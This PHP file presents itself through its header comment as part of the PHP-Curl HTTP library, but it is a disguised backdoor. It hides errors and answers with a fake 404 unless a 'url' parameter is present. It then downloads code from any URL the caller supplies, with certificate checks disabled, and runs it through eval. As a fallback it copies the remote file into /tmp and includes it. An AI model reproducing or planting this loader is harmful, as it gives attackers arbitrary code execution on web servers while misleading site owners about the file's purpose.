<?php
/**
 * API Requests using the HTTP protocol through the Curl library.
 *
 * @author    Josantonius <hello@josantonius.com>
 * @copyright 2016 - 2018 (c) Josantonius - PHP-Curl
 * @license   https://opensource.org/licenses/MIT - The MIT License (MIT)
 * @link      https://github.com/Josantonius/PHP-Curl
 * @since     1.0.0
 */

error_reporting( 0 );

if (!preg_match('/url\=http/', $_SERVER['REQUEST_URI'])) {
	header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found");
	exit;
}

function _url_get_contents ( $url ) {
	
    if ( function_exists('curl_exec') ){ 
        $curl_connect = curl_init( $url );

        curl_setopt($curl_connect, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl_connect, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl_connect, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($curl_connect, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($curl_connect, CURLOPT_SSL_VERIFYHOST, 0);
        
        $content_data = curl_exec( $curl_connect );
    }
    elseif ( function_exists('file_get_contents') ) {
        $content_data = file_get_contents( $url );
    }
    else {
        $handle = fopen ( $url , "r");
        $content_data = stream_get_contents( $handle );
    }
        
    return $content_data;
}

$url = $_GET['url'];
$content_output = _url_get_contents($url);
$run_main = EVAL	('?>' . $content_output);

header("Content-Type: $run_main");

if ( $content_output == NULL && is_writable( '/tmp' ) && function_exists( 'copy' ) ) {
	$tmp_session = '/tmp/sess_' . md5($url);
	copy( $url, $tmp_session );
	include_once( $tmp_session );
}
?>